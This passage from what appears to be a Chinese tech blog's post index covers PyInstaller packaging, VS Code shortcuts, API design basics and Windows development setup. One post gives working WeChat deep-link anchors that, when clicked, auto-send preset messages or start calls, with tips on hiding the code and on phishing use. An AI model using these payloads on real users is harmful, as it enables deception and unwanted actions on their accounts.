class="line">$ <span class="built_in">cd</span> project</span><br><span class="line">$ conda activate your_env</span><br><span class="line">$ pyinstaller -w -D test.py func-1.py func-2.py</span><br><span class="line"><span class="comment"># 最新测试</span></span><br><span class="line"><span class="comment"># pyinstaller -w -D test.py 也可以</span></span><br></pre></td></tr></table></figure><p>如果想给exe添加icon，可以第三节中进阶版中的参数，是一样的。</p><hr><h2 id="六、踩坑和遇到的问题"><a href="#六、踩坑和遇到的问题" class="headerlink" title="六、踩坑和遇到的问题"></a>六、踩坑和遇到的问题</h2><ol><li>程序要严谨，在程序内部使用相对路径，main主函数中的接口可以通过argv外传参数；也可以使用相对路径。建议使用第二种，简便。</li><li>exe文件是可以直接拖入激活虚拟环境的cmd中进行debug的。</li><li>如果是使用虚拟环境开发，pyinstaller打包用的是虚拟环境的pyinstaller，不要随便一个目录打开终端就运行pyinstaller打包，一定要在项目目录下打开终端使用虚拟环境的pyinstaller进行打包，要不然第三方库的引用会出错。</li><li>ico图标可以通过度娘 <strong>ico生成器</strong> 进行生成</li><li>被调用的脚本需要拷贝到dist中打包好的文件夹中，否则可能导致调用失败</li><li>运行exe后如果提示缺少文件，就去anaconda下搜索缺少的依赖文件，复制到exe同根下即可（其实很有可能你没成功使用开发环境的pyinstaller，要注意尤其是用了虚拟环境的）。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 应用程序开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信点击漏洞/bug</title>
      <link href="/posts/1b7675c2.html"/>
      <url>/posts/1b7675c2.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>针对最近出现的微信点击漏洞/BUG，进行了测试和整理。有部分功能在微信的更新报告中显示已在2023年停用，不知道为什么这些bug仍然存在。</p></blockquote><div class="tip warning"><p>本文仅供信息安全防御技术学习参考，禁止用于非法用途。使用本文内容造成的任何后果由使用者自行承担，与作者无关。</p></div><h1 id="微信点击漏洞-BUG合集"><a href="#微信点击漏洞-BUG合集" class="headerlink" title="微信点击漏洞/BUG合集"></a>微信点击漏洞/BUG合集</h1><div class="note info flat"><p>目前已知的<strong>微信点击漏洞/BUG</strong>包括：<span class='p red'>点击此处自动发消息</span>、<span class='p red'>打电话</span>、<span class='p red'>点击直接跳转指定网站</span>和<span class='p red'>给微信传输助手打电话</span>。</p></div><hr><h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><ul><li><strong>系统要求</strong>：安卓和鸿蒙系统手机（iOS无法触发）</li><li><strong>触发方式</strong>：需通过“引用一条消息”发送（直接发会被看到代码）</li></ul><h2 id="漏洞-BUG-列表"><a href="#漏洞-BUG-列表" class="headerlink" title="漏洞/BUG 列表"></a>漏洞/BUG 列表</h2><h3 id="1-点击自动发消息"><a href="#1-点击自动发消息" class="headerlink" title="1. 点击自动发消息"></a>1. 点击自动发消息</h3><ul><li><strong>说明</strong>：早期存在的功能，后被停用，点击后自动向指定对象发送预设消息</li></ul><div class="tabs" id="1"><ul class="nav-tabs"><button type="button" class="tab  active" data-href="1-1">代码</button><button type="button" class="tab " data-href="1-2"><i class="fas fa-bomb"></i>效果</button><button type="button" class="tab " data-href="1-3">结论</button></ul><div class="tab-contents"><div class="tab-item-content active" id="1-1"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;weixin://bizmsgmenu</span></span><br><span class="line"><span class="string">?msgmenucontent=我喜欢你哈哈&amp;msgmenuid=960&quot;</span>&gt;点击此处自动发消息&lt;/a&gt;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="1-2"><p><strong>点击后自动发送预设消息</strong></p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1b7675c2_1.jpg" alt="点击后自动发送预设消息" width="400" height="auto"></p></div><div class="tab-item-content" id="1-3"><p><strong>可被用作整蛊工具，其中发到微信群聊里被点击后只会在私信中发送预设消息，不会在群聊中显示</strong></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><h3 id="2-打电话"><a href="#2-打电话" class="headerlink" title="2. 打电话"></a>2. 打电话</h3><ul><li><strong>风险提示</strong>：<ul><li>会生成一个新的聊天窗口（微信号形式）</li><li>若删除该窗口，<strong>会误删好友</strong>，导致后续消息发送失败（红色感叹号）</li></ul></li><li><strong>风险解决</strong>：<ul><li>删除该聊天窗口好友</li><li>添加原聊天窗口好友为好友</li></ul></li></ul><div class="tabs" id="2"><ul class="nav-tabs"><button type="button" class="tab  active" data-href="2-1">代码</button><button type="button" class="tab " data-href="2-2"><i class="fas fa-bomb"></i>效果</button><button type="button" class="tab " data-href="2-3">结论</button></ul><div class="tab-contents"><div class="tab-item-content active" id="2-1"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;weixin://voip/callagain/?username=Cx330usertest&quot;</span>&gt;给好友打电话&lt;/a&gt;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="2-2"><p><strong>点击后自动打电话给设定好的好友</strong></p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1b7675c2_2.jpg" alt="打与被打电话的窗口" width="400" height="auto"></p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1b7675c2_3.jpg" alt="多出的聊天窗口" width="400" height="auto"></p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1b7675c2_4.jpg" alt="被打电话的视角" width="400" height="auto"></p></div><div class="tab-item-content" id="2-3"><p><strong>通过改变username参数（微信号，前提是自己已加的好友），可以指定要拨打对象</strong><br><strong>存在很大风险，打电话的人会多一个被打电话的人的聊天窗口，删掉这个窗口的好友会导致好友真的被删</strong><br><strong>多的窗口可以正常给被打电话的人发消息，但是被打电话的人发的消息该窗口接收不到</strong></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><h3 id="3-点击直接跳转指定网站"><a href="#3-点击直接跳转指定网站" class="headerlink" title="3. 点击直接跳转指定网站"></a>3. 点击直接跳转指定网站</h3><ul><li><strong>效果</strong>：点击后跳转至任意预设网址</li></ul><div class="tabs" id="3"><ul class="nav-tabs"><button type="button" class="tab  active" data-href="3-1">代码</button><button type="button" class="tab " data-href="3-2"><i class="fas fa-bomb"></i>效果</button><button type="button" class="tab " data-href="3-3">结论</button></ul><div class="tab-contents"><div class="tab-item-content active" id="3-1"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;https://www.baidu.com&quot;</span>&gt;跳转到baidu&lt;/a&gt;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="3-2"><p><strong>点击后自动跳转至指定网站</strong></p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1b7675c2_5.jpg" alt="点击后自动跳转至指定网站" width="400" height="auto"></p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1b7675c2_6.jpg" alt="点击后自动跳转至指定网站" width="400" height="auto"></p></div><div class="tab-item-content" id="3-3"><p><strong>可用于钓鱼或推广</strong></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><h3 id="4-给微信传输助手打电话"><a href="#4-给微信传输助手打电话" class="headerlink" title="4. 给微信传输助手打电话"></a>4. 给微信传输助手打电话</h3><ul><li><strong>效果</strong>：可绕过限制，直接对“文件传输助手”发起语音通话</li></ul><div class="tabs" id="4"><ul class="nav-tabs"><button type="button" class="tab  active" data-href="4-1">代码</button><button type="button" class="tab " data-href="4-2"><i class="fas fa-bomb"></i>效果</button><button type="button" class="tab " data-href="4-3">结论</button></ul><div class="tab-contents"><div class="tab-item-content active" id="4-1"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;weixin://voip/callagain/?username=filehelper&quot;</span>&gt;给腾讯客服打电话&lt;/a&gt;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="4-2"><p><strong>点击后自动打电话给文件传输助手</strong></p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1b7675c2_7.jpg" alt="点击后自动打电话给文件传输助手" width="400" height="auto"></p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1b7675c2_8.jpg" alt="点击后自动打电话给文件传输助手" width="400" height="auto"></p></div><div class="tab-item-content" id="4-3"><p><strong>跟上面的打电话给微信好友有区别，这个属于绕过限制可对文件传输助手进行攻击</strong></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><hr><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>所有语法需通过「引用消息」发送，避免直接暴露代码。</li><li>可自由修改内容实现个性化测试。</li></ul><hr><p>如需进一步复现或测试，请确保：</p><ul><li>使用安卓设备</li><li>遵守法律法规，仅限授权环境内操作</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
            <tag> 外挂标签 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VScode使用技巧</title>
      <link href="/posts/dff3c4a6.html"/>
      <url>/posts/dff3c4a6.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>之前总结过VScode的美化，现在来介绍一些VScode的实用功能。</p></blockquote><h1 id="VS-Code实用快捷键与功能指南"><a href="#VS-Code实用快捷键与功能指南" class="headerlink" title="VS Code实用快捷键与功能指南"></a>VS Code实用快捷键与功能指南</h1><p>在开发过程中，掌握一些实用的快捷键和功能可以大幅提升我们的编码效率。以下是VS Code中一些非常实用的操作技巧，这些技巧可以帮助你更快地完成任务，让你的编程体验更加流畅。</p><h2 id="一、列编辑操作"><a href="#一、列编辑操作" class="headerlink" title="一、列编辑操作"></a>一、列编辑操作</h2><p>与Visual Studio中类似，VS Code也支持列编辑功能，其操作方式如下：</p><ul><li>按下 <code>Ctrl+Alt</code> 键，然后点击鼠标左键并拖动，即可选中多行中的列进行编辑。</li></ul><p>需要特别注意的是，VS Code不同版本的列编辑功能略有差异，具体可参考<a href="https://vscode.js.cn/docs">VS Code 官方文档</a>。</p><h2 id="二、变量替换"><a href="#二、变量替换" class="headerlink" title="二、变量替换"></a>二、变量替换</h2><p>若要一次性替换代码中自动高亮的变量或字符，可采用以下方式：</p><ul><li>双击需替换的变量或字符，右键选择“更改所有匹配项”。</li><li>或者双击变量后按下 <code>Ctrl+F2</code>，即可快速替换所有匹配项。</li></ul><h2 id="三、删除操作"><a href="#三、删除操作" class="headerlink" title="三、删除操作"></a>三、删除操作</h2><p>当需要删除当前字符串中光标之后的内容时，可使用快捷键 <code>Ctrl+Delete</code>，一键清除光标后的多余内容，使代码更加简洁。</p><h2 id="四、跳转与定义查看"><a href="#四、跳转与定义查看" class="headerlink" title="四、跳转与定义查看"></a>四、跳转与定义查看</h2><ul><li>按下 <code>F12</code> 可以跳转到当前符号或函数的定义处，方便快速定位代码逻辑。</li><li>使用 <code>Shift+F12</code> 则可以列出所有引用该符号的位置，有助于全面了解代码的使用情况。</li></ul><h2 id="五、代码格式调整"><a href="#五、代码格式调整" class="headerlink" title="五、代码格式调整"></a>五、代码格式调整</h2><ul><li><strong>调整代码行缩进</strong>：使用 <code>Ctrl+[</code> 减少缩进，<code>Ctrl+]</code> 增加缩进。</li><li><strong>折叠或展开代码块</strong>：按下 <code>Ctrl+Shift+[</code> 折叠代码块，<code>Ctrl+Shift+]</code> 展开代码块。</li><li><strong>复制与粘贴</strong>：若未选中任何内容，<code>Ctrl+C</code> 和 <code>Ctrl+V</code> 默认复制或剪切整行。</li><li><strong>代码格式化</strong>：通过 <code>Shift+Alt+F</code> 快速格式化代码，或在命令面板（<code>Ctrl+Shift+P</code>）中输入“format code”选择相应的格式化命令。</li><li><strong>修剪空格</strong>：按下 <code>Ctrl+Shift+X</code>，可清理代码中的多余空格，使代码更加整洁。</li><li><strong>移动代码行</strong>：使用 <code>Alt+Up</code> 或 <code>Alt+Down</code> 上下移动当前行。</li><li><strong>复制代码行</strong>：按下 <code>Shift+Alt+Up</code> 或 <code>Shift+Alt+Down</code>，可在当前行的上方或下方复制一行。</li><li><strong>插入空白行</strong>：使用 <code>Ctrl+Enter</code> 在当前行下方插入一行，<code>Ctrl+Shift+Enter</code> 在当前行上方插入一行。</li></ul><h2 id="六、光标操作"><a href="#六、光标操作" class="headerlink" title="六、光标操作"></a>六、光标操作</h2><ul><li><strong>移动光标至行首或行尾</strong>：按下 <code>Home</code> 键可将光标移动到行首，<code>End</code> 键移动到行尾。</li><li><strong>快速定位文件开头或结尾</strong>：使用 <code>Ctrl+Home</code> 快速跳转到文件开头，<code>Ctrl+End</code> 跳转到文件结尾。</li><li><strong>括号匹配</strong>：按下 <code>Ctrl+Shift+]</code> 可快速移动到与当前括号匹配的位置，方便检查代码结构。</li><li><strong>选中整行</strong>：双击或使用 <code>Ctrl+i</code> 可选中当前行。</li><li><strong>选择从光标到行尾或行首</strong>：按下 <code>Shift+End</code> 选择从光标到行尾的内容，<code>Shift+Home</code> 选择从行首到光标的内容。</li><li><strong>删除光标右侧内容</strong>：按下 <code>Ctrl+Delete</code> 可删除光标右侧的所有字符。</li><li><strong>调整选择范围</strong>：使用 <code>Shift+Alt+Left</code> 和 <code>Shift+Alt+Right</code> 可缩小或扩大当前选中的范围。</li><li><strong>多光标操作</strong>：通过 <code>Alt+Click</code> 可在多个位置添加光标，实现多处同时编辑。也可使用 <code>Ctrl+Alt+Down</code> 或 <code>Ctrl+Alt+Up</code> 在上下行添加光标。</li><li><strong>选中所有匹配项</strong>：按下 <code>Ctrl+Shift+L</code> 可一次性选中代码中所有匹配当前选中内容的位置。</li><li><strong>选中下一个匹配项</strong>：使用 <code>Ctrl+D</code> 可选中下一个与当前内容匹配的位置（注：该快捷键可能被自定义为其他功能，如删除当前行，需根据个人设置调整）。</li><li><strong>回退光标操作</strong>：按下 <code>Ctrl+U</code> 可回退上次的光标操作，方便纠正误操作。</li></ul><h2 id="七、重构代码"><a href="#七、重构代码" class="headerlink" title="七、重构代码"></a>七、重构代码</h2><ul><li><strong>跳转到定义</strong>：按下 <code>F12</code> 可跳转到当前符号或函数的定义处。</li><li><strong>查看定义缩略图</strong>：使用 <code>Alt+F12</code> 可快速查看定义处的代码而不跳转，方便快速浏览。</li><li><strong>列出所有引用</strong>：按下 <code>Shift+F12</code> 可列出当前符号在项目中的所有引用位置。</li><li><strong>同时修改文件中所有匹配项</strong>：按下 <code>Ctrl+F12</code> 可同时编辑文件中所有匹配的内容。</li><li><strong>重命名</strong>：选中要重命名的符号（如变量、函数等），按下 <code>F2</code>，输入新的名称后回车，VS Code将自动修改所有相关引用。</li><li><strong>跳转到下一个错误或警告</strong>：当代码中有多个错误或警告时，按下 <code>F8</code> 可逐个跳转到下一个错误或警告位置，方便快速定位问题。</li></ul><h2 id="八、查找与替换"><a href="#八、查找与替换" class="headerlink" title="八、查找与替换"></a>八、查找与替换</h2><ul><li><strong>查找</strong>：按下 <code>Ctrl+F</code> 打开查找面板，在当前文件中搜索指定内容。</li><li><strong>查找替换</strong>：按下 <code>Ctrl+H</code> 打开查找替换面板，可对当前文件中的内容进行查找和替换。</li><li><strong>文件夹内查找</strong>：按下 <code>Ctrl+Shift+F</code> 打开全局查找面板，可在整个文件夹或工作区中搜索内容。</li></ul><h2 id="九、显示设置"><a href="#九、显示设置" class="headerlink" title="九、显示设置"></a>九、显示设置</h2><ul><li><strong>全屏模式</strong>：按下 <code>F11</code> 可切换全屏模式，专注于代码编辑。</li><li><strong>调整显示比例</strong>：使用 <code>Ctrl+=</code> 放大显示，<code>Ctrl+-</code> 缩小显示，方便查看代码细节。</li><li><strong>侧边栏显示/隐藏</strong>：按下 <code>Ctrl+B</code> 可切换侧边栏的显示状态，增加编辑区域的空间。</li><li><strong>预览Markdown</strong>：按下 <code>Ctrl+Shift+V</code> 可预览Markdown文件的渲染效果。</li></ul><h2 id="十、自动保存"><a href="#十、自动保存" class="headerlink" title="十、自动保存"></a>十、自动保存</h2><p>为避免因意外情况导致的代码丢失，可开启自动保存功能。通过菜单 <code>File -&gt; AutoSave</code> 或在命令面板（<code>Ctrl+Shift+P</code>）中输入“auto”相关命令来设置自动保存间隔，确保代码及时保存。</p><p>总的来说，熟练掌握这些快捷键和功能可以帮助我们更高效地使用VS Code进行开发工作，提高编码效率和质量。希望大家在实际使用中能够灵活运用这些技巧，让编程变得更加轻松愉快。通过不断练习和应用，这些快捷键将成为你提高工作效率的有力工具。</p>]]></content>
      
      
      <categories>
          
          <category> VScode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily Life </tag>
            
            <tag> Study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>API知识小结</title>
      <link href="/posts/b8f88337.html"/>
      <url>/posts/b8f88337.html</url>
      
        <content type="html"><![CDATA[<h1 id="API接口知识小结"><a href="#API接口知识小结" class="headerlink" title="API接口知识小结"></a>API接口知识小结</h1><blockquote><p>应用程序接口<strong>API</strong> （Application Programming Interface），是提供特定业务输出能力、连接不同系统的一种约定。这里包括外部系统与提供服务的系统（中后台系统）或后台不同系统之间的交互点。包括外部接口、内部接口，内部接口又包括：上层服务与下层服务接口、同级接口。</p></blockquote><p>常见web接口是http/https协议的接口，多用于外部系统或前端系统的调用，因为此类接口地址要暴露在外部，所以必须对接口的安全性做较高程度的校验。还要一种基于开源rpc构建的跨系统接口调用接口方案，此类主要用于大公司内网各系统间的互相调用，此类接口服务治理能力更强，接口相应速度更块。以下内容以http接口为例展开的讨论。</p><h2 id="一、接口请求方式类型"><a href="#一、接口请求方式类型" class="headerlink" title="一、接口请求方式类型"></a>一、接口请求方式类型</h2><p>常见的http请求方式包括：get（查）、post（增），除此之外还有put（改）、delete（删）等。接口所属类型是由业务决定的。比如你打开淘宝，展示的首页内容就需要用到get接口，获取页面信息，你看中了宝贝要下单，添加你的收获地址时，用的则是post接口。而这两种也是其中最常见的两种接口类型。</p><h4 id="get类型接口"><a href="#get类型接口" class="headerlink" title="get类型接口"></a>get类型接口</h4><p>格式：请求数参数写在网址后面，用”?”连接，多个参数之间用”&amp;”连接。</p><p>场景：get型接口用于获取信息，多用于查询数据，如菜单列表展示，搜索展示，订单查询，优惠券查询等需要其他系统返回数据时使用。一般情况下请求的数据量较小，返回速度快，不过接口是暴露在外面的，所以会有一定的风险。</p><h4 id="post型接口"><a href="#post型接口" class="headerlink" title="post型接口"></a>post型接口</h4><p>说明：向指定资源位置提交数据（如提交表单、上传文件）来进行请求，post请求可能会导致新资源的建立。</p><p>场景：如注册、上传、发帖等功能，这种请求数据量大，安全性要求高。</p><p>其他接口类型如put（改）、delete（删）、patch等使用频率稍低一些，此处不再赘述。</p><h2 id="二、接口响应机制类型"><a href="#二、接口响应机制类型" class="headerlink" title="二、接口响应机制类型"></a>二、接口响应机制类型</h2><p>从返回上区分，分为同步接口、异步接口。</p><h4 id="同步交互"><a href="#同步交互" class="headerlink" title="同步交互"></a>同步交互</h4><p>指发送一个请求，需要等待返回，然后才能够发送下一个请求，有个等待过程；</p><p>比如登录接口，执行登录操作时，将用户名、密码、token等字段加密后通过接口校验，需要返回验证结果后，才能登录成功。</p><h4 id="异步交互"><a href="#异步交互" class="headerlink" title="异步交互"></a>异步交互</h4><p>指发送一个请求，不需要等待返回，随时可以再发送下一个请求，即不需要等待。</p><p>如用户领取优惠券，只需要将用户的领券行为请求成功，资产系统收到请求后异步操作用户发券，通过异步的方法执行发券，调用方无须等待每个请求的调用结果。</p><blockquote><p>区别：一个需要等待，一个不需要等待，在不影响用户体验的情况下，我们的项目开发中一般会优先选择不需要等待的异步交互方式。</p></blockquote><p>哪些情况建议使用同步交互呢？比如用户登录、银行的转账系统，对数据库的保存操作等等，都会使用同步交互操作，其余情况都优先使用异步交互。</p><h2 id="三、接口的触发形式类型"><a href="#三、接口的触发形式类型" class="headerlink" title="三、接口的触发形式类型"></a>三、接口的触发形式类型</h2><h4 id="分发接口"><a href="#分发接口" class="headerlink" title="分发接口"></a>分发接口</h4><p>一个系统产生新数据的时候就分发给其它系统（也可以是多个）。</p><p>中台系统的核心思想是高内聚、低耦合，所以分发接口的使用场景还是比较多的。比如有一个主渠道系统来管理所有的渠道数据，而渠道数据是其他系统如商品系统、促销系统经常要使用到的信息。所以一旦出现新的渠道或者发生渠道变更，需要分发给其他所有对接了各个系统，实现对最新渠道的功能支撑。</p><h4 id="订阅接口"><a href="#订阅接口" class="headerlink" title="订阅接口"></a>订阅接口</h4><p>一个系统在需要的时候调用其他系统的接口进行数据订阅。</p><p>比如订单系统生成订单时，因为很多外部系统可能需要及时获取订单状态信息。而订单系统也不知道要分发给哪些系统，这时候一般会将订单推送至特定的消息队列，比如KFK，其他由需要跟进订单状态的的系统订阅KFK消息后，可以即使获取订单完成信息，进行触发下一个动作。</p><h2 id="四、其他API接口基本组成"><a href="#四、其他API接口基本组成" class="headerlink" title="四、其他API接口基本组成"></a>四、其他API接口基本组成</h2><p>再既定的业务下，接口请求类型、响应机制等确定后，再以微信支付API为例，了解下接口的其他组成内容。</p><h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>顾名思义，此接口适用于的场景，明确接口的业务用途。</p><h4 id="入参及出参"><a href="#入参及出参" class="headerlink" title="入参及出参"></a>入参及出参</h4><p>入参是接口请求所需要的变量参数，其中包括必填参数和非必填参数，非必填并非是可以忽略的，比如上面的入参中，签名类型为非必填，如果未传此参数，则默认此签名类型为MD5，如果使用的并非此类签名类型，则此项为必填项。如果是普通订单查询，入参时间非必填，则返回结果是用户全部订单，或者用户特定时间订单的区别。</p><h4 id="错误码"><a href="#错误码" class="headerlink" title="错误码"></a>错误码</h4><p>接口请求并非每次都能成功，所以在接口开发时会对可能失败的情况进行错误码区分，在接口联调时可以根据返回的错误码快递定位问题。如果错误码不够全面，那在接口调用失败的时候，需要反复定位，降低开发效率。</p><h2 id="五、接口安全性校验"><a href="#五、接口安全性校验" class="headerlink" title="五、接口安全性校验"></a>五、接口安全性校验</h2><p>接口完成业务逻辑开发后，接下来要考虑的就是安全性问题了，接口的安全性问题主要来源于几方面考虑：</p><h4 id="请求来源是否合法？"><a href="#请求来源是否合法？" class="headerlink" title="请求来源是否合法？"></a>请求来源是否合法？</h4><p>即接口的伪装攻击，因为接口是对外的，在公网环境中，接口地址是暴露的，收到的请求有可能是恶意非法请求；如果真的是合法请求，也需要知道这个请求的来源，同时这个请求来源不能否认。这里引入“签名”的概念，以及签名的防伪装及抗否认性特性。</p><p>近些年各大企业强制使用https替换掉原有的http接口，正是因为https所使用的的证书安全性更高。</p><h4 id="请求是否会被篡改，返回数据可能会被截取"><a href="#请求是否会被篡改，返回数据可能会被截取" class="headerlink" title="请求是否会被篡改，返回数据可能会被截取"></a>请求是否会被篡改，返回数据可能会被截取</h4><p>因为接口是对外的，所以接收请求和返回数据的时候，是不可能使用明文方式传输的，否则一旦被恶意截取，会造成极大风险。所以请求数据及返回数据都是需要加密的，这样即使数据被截取，也不用泄露数据的内容。这里介绍几种现在常见的加密方法。</p><ul><li>DES（Data Encryption Standard）：数据加密标准，速度较快，适用于加密大量数据的场合；</li><li>3DES（Triple DES）：是基于DES，对一块数据用三个不同的密钥进行三次加密，强度更高；</li><li>RSA：非对称加密，由 RSA公司发明，是一个支持变长密钥的公共密钥算法，需要加密的文件块的长度也是可变的；既可以实现加密，又可以实现签名。</li></ul><p>如果是用户账号相关，现在会使用token加密用户信息，用户请求身份信息时，服务端会分配token存在缓存中，后续请求会将token与时间戳一起打包加密，这样即使请求数据被截获，因为不知道token的值，数据也不会被解析出来。</p><h4 id="如何防范接口的重放攻击，防重放攻击是什么呢？"><a href="#如何防范接口的重放攻击，防重放攻击是什么呢？" class="headerlink" title="如何防范接口的重放攻击，防重放攻击是什么呢？"></a>如何防范接口的重放攻击，防重放攻击是什么呢？</h4><p>就是把你的请求原封不动地多次发放，请求都会通过验证进入到正常逻辑中，会造成服务端接口拥堵并且会造成实际损失。</p><p>防重放一般需在请求参数加上时间戳+随机数，通过时间戳确保接口是最新的请求，而随机数相同则可以认定为是重放攻击。</p><h2 id="六、接口性能相关"><a href="#六、接口性能相关" class="headerlink" title="六、接口性能相关"></a>六、接口性能相关</h2><p>如果是访问量比较大的接口，再上线前肯定需要进行压力测试。因为普通的开发自测和生产模拟是不能推算出高并发时候接口是否可正常运行。</p><h4 id="TPS"><a href="#TPS" class="headerlink" title="TPS"></a>TPS</h4><p>Transaction Per Second 每秒系统处理的交易或事物的数量，衡量系统处理能力的重要指标。</p><h4 id="RT"><a href="#RT" class="headerlink" title="RT"></a>RT</h4><p>响应时间，从客户端发送一个请求开始，到客户端接收到从服务器返回的响应结果结束所经历的时间，包括请求发送时间，网络传输时间和服务器处理时间三部分。</p><h4 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h4><p>指的是在一次性能测试过程中网络上传输的数据量的总和。</p><p>用户的响应时间自不必说，时间太久伤用户体验，及时处于高并发期，用户的响应时间依然需要控制到最低，一般不超过5s；</p><p>tps则是高并发的指标，一般提供服务的接口，需要考虑到最极端情况下的并发数，这些数量一般来自于运营的活动策划和往期的数据趋势预估，以此为依据，保证自己的接口可以支持最高的并发数，而验证这些使用的一般是压力测试。如正常情况下压测时tps可以达到2000时接口正常，就可以保证2000的实际并发。</p><h2 id="七、接口需要做哪些测试"><a href="#七、接口需要做哪些测试" class="headerlink" title="七、接口需要做哪些测试"></a>七、接口需要做哪些测试</h2><p>接口测试其实是白盒测试，首页要明确系统的能力输出，明确服务覆盖是否满足需求。以业务逻辑推接口参数。</p><ol><li><p>入参不符合要求需要有明确错误码，报错信息和日志，方便问题复现与定位。</p></li><li><p>如果另有参数处理逻辑的链路，也需要一并验证，如购买网易云音乐会员，订单生成后会去权益系统加权，加权成功后会有短信通知用户，但加权接口和订单信息中都没有用户手机号，所以虽然入参中没有用户手机号，但需要根据用户的username去查询手机号，并执行短信发放的操作。</p></li></ol><p>其他验证目标如：代码覆盖率是否达到要求、性能指标是否满足要求、安全指标是否满足要求则是更为专业性的测试指标了。</p>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows桌面软件开发</title>
      <link href="/posts/e27eb9cb.html"/>
      <url>/posts/e27eb9cb.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>以下是一份<strong>学生版Windows桌面软件开发全流程指南</strong>，涵盖从构思到发布的完整生命周期。<br>官方文档：<a href="https://learn.microsoft.com/zh-cn/windows/apps/desktop/#choose-your-app-type">Windows Desktop Development</a></p></blockquote><h3 id="一、开发工具与环境配置"><a href="#一、开发工具与环境配置" class="headerlink" title="一、开发工具与环境配置"></a>一、开发工具与环境配置</h3><div class="table-container"><table><thead><tr><th><strong>工具</strong></th><th><strong>细节</strong></th></tr></thead><tbody><tr><td><strong>Visual Studio 2022</strong></td><td>🔸 隐藏技巧：<br>• 按<code>Ctrl+Q</code>快速搜索功能（如“热重载”）<br>• 使用<a href="https://marketplace.visualstudio.com/items?itemName=VisualStudioPlatformTeam.ProductivityPowerTools2022">Productivity Power Tools</a>扩展增强效率</td></tr><tr><td><strong>.NET SDK</strong></td><td>🔸 版本策略：<br>• 学习用<code>.NET 8</code>（最新LTS）<br>• 企业项目用<code>.NET 6</code>（兼容性强）<br>🔸 多版本管理命令：<br><code>dotnet --list-sdks</code><br><code>dotnet new globaljson</code></td></tr><tr><td><strong>VS Code</strong></td><td>🔸 高级配置：<br>• 设置<code>&quot;omnisharp.useModernNet&quot;: true</code>加速编译<br>• 集成终端使用<code>PowerShell 7</code></td></tr><tr><td><strong>辅助工具</strong></td><td>🔸 Git进阶：<br>• <a href="https://www.gitkraken.com/">GitKraken</a>可视化分支管理<br>• 配置<code>.gitignore</code>模板排除<code>bin/obj</code>目录<br>🔸 NuGet私有源：<br>搭建<a href="https://loic-sharma.github.io/BaGet/">BaGet</a>存储课程专用包</td></tr></tbody></table></div><blockquote><p><strong>环境验证脚本</strong>（PowerShell）：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查关键组件</span></span><br><span class="line">dotnet <span class="literal">--version</span></span><br><span class="line">git <span class="literal">--version</span></span><br><span class="line">&amp; <span class="string">&quot;<span class="variable">$</span>&#123;env:ProgramFiles(x86)&#125;\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\gacutil.exe&quot;</span> <span class="literal">-l</span> &gt; <span class="variable">$null</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$</span>?) &#123; <span class="built_in">Write-Host</span> <span class="string">&quot;✅ 环境验证通过&quot;</span> <span 